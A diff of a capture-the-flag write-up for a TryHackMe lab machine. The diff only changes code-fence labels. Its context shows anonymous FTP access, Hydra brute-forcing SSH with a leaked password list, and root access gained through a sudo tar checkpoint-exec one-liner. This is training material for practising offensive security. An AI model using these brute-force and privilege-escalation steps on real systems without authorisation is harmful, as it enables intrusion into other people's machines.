@@ -60,7 +60,7 @@ I scanned all directories, but nothing interesting there ,let's move on
 
 Next step is FTP can login with anonymous 
 
-```console
+```shell
 ┌─[root@cyb3rhoL1c]─[~/Desktop/tryhackme/machine/bounty_hacker]
 └──╼ #ftp 10.10.85.90
 Connected to 10.10.85.90.
@@ -73,7 +73,7 @@ ftp>
 ```
 `ls -al` 
 
-```console
+```shell
 ftp> ls -al
 200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
@@ -87,7 +87,7 @@ ftp>
 ```
 Let's download these two files with `get` command
 
-```console
+```shell
 ftp> get locks.txt
 local: locks.txt remote: locks.txt
 200 PORT command successful. Consider using PASV.
@@ -106,7 +106,7 @@ ftp>
 
 `task.txt`
 
-```console
+```shell
 ┌─[root@cyb3rhoL1c]─[~/Desktop/tryhackme/machine/bounty_hacker]
 └──╼ #cat task.txt 
 1.) Protect Vicious.
@@ -118,7 +118,7 @@ ftp>
 
 `locks.txt`
 
-```console
+```shell
 ┌─[root@cyb3rhoL1c]─[~/Desktop/tryhackme/machine/bounty_hacker]
 └──╼ #cat locks.txt 
 rEddrAGON
@@ -154,7 +154,7 @@ Look like `passowrd` file. According to `task.txt` file `lin` can be username
 
 So let's bruteforce with hydra for ssh :)
 
-```console
+```shell
 ┌─[root@cyb3rhoL1c]─[~/Desktop/tryhackme/machine/bounty_hacker]
 └──╼ #hydra -l lin -P locks.txt ssh://10.10.85.90
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
@@ -173,7 +173,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-07-31 20:17:
 
 OK! Now we got username and password , let's login
 
-```console
+```shell
 ┌─[root@cyb3rhoL1c]─[~/Desktop/tryhackme/machine/bounty_hacker]
 └──╼ #ssh lin@10.10.85.90
 lin@10.10.85.90's password: 
@@ -196,7 +196,7 @@ THM{CR**************T3}
 
 # [](#header-2)Privilege Escalation
 
-```console
+```shell
 lin@bountyhacker:~$ sudo -l
 [sudo] password for lin: 
 Matching Defaults entries for lin on bountyhacker:
@@ -215,7 +215,7 @@ Now we use this command for privilege escalation
 
 `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
 
-```console
+```shell
 lin@bountyhacker:~$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 tar: Removing leading `/' from member names
 # cd /root
